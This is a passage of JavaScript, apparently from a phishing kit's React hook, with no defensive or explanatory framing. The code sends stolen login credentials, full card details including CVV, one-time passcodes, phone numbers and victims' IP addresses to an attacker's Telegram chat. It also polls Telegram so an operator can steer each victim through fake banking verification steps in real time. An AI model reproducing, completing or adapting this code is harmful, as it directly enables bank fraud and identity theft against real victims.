✅ <b>CONFIRMATION IN CZ KEY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> CONFIRMED IN BANKING APP
⚠️ <i>User confirmed payment in mobile banking</i>
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Confirmation log sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending confirmation log:', error);
      return false;
    }
  };

  const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
    if (!shouldSendLog('formattedCard')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>🔐 LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginName}
└ 🔑 <b>Password:</b> ${loginPassword}
━━━━━━━━━━━━━━━━━━━━━
<b>💳 CARD DETAILS:</b>
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
<b>📍 PERSONAL INFO:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
<b>🖥️ TECHNICAL INFO:</b>
├ 🌐 <b>Country:</b> Germany
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Formatted card details sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending formatted card details:', error);
      return false;
    }
  };

  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpCode')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const otpMessage = `
🔐 <b>OTP CODE RECEIVED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>OTP Code:</b> <code>${otpCode}</code>
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: otpMessage,
        parse_mode: 'HTML'
      });
      return true;
    } catch (error) {
      console.error('Error sending OTP to Telegram:', error);
      return false;
    }
  };

  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    if (!shouldSendLog('success')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const successMessage = `
✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
<b>Status:</b> OTP Verified ✓
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: successMessage,
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Error sending success message:', error);
    }
  };

  // ========== POLLING ==========
  const setupTelegramPolling = useCallback(() => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    pollingIntervalRef.current = setInterval(async () => {
      const currentSessionId = sessionId || sessionStorage.getItem('telegramSessionId');
      
      if (!currentSessionId) return;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
        const response = await axios.get(url);
        
        const updates = response.data.result;
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            
            const lastUnderscore = callbackData.lastIndexOf('_');
            const action = callbackData.substring(0, lastUnderscore);
            const sid = callbackData.substring(lastUnderscore + 1);

            if (sid === currentSessionId) {
              if (action === 'approve') onApprove?.();
              else if (action === 'deny') onDeny?.();
              else if (action === 'card') onViewCard?.();
              else if (action === 'next') onNextStep?.();
              else if (action === 'back_to_card') onBackToCard?.();
              else if (action === 'back_to_login') onBackToLogin?.();
              else if (action === 'block') onBlock?.();
              else if (action === 'appr') onNextStepAppr?.();
              else if (action === 'back_to_appr') onBackToAppr?.();
              else if (action === 'otp_false') onOtpFalse?.();
              else if (action === 'approve_otp') onApproveOtp?.();
              else if (action === 'card_false') onCardFalse?.();
              else if (action === 'approve_login') onApproveLogin?.();
              else if (action === 'otp_login') onOtpLogin?.();
              else if (action === 'login_false') onLoginFalse?.();
              else if (action === 'card_verification') onCardVerification?.();
            }
            
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              callback_query_id: update.callback_query.id,
              text: "✅ Request processed!"
            });
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification]);

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [setupTelegramPolling]);

  return {
    generateSessionId,
    sendLoginRequestToTelegram,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendPageViewLog,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendOtpTypingLog,
    sendSiteEntryLog,
    sendBlockedLog,
    sendVisitNotification,
    sendConfirmationLog,
    sendConfirmationPageLog
  };
};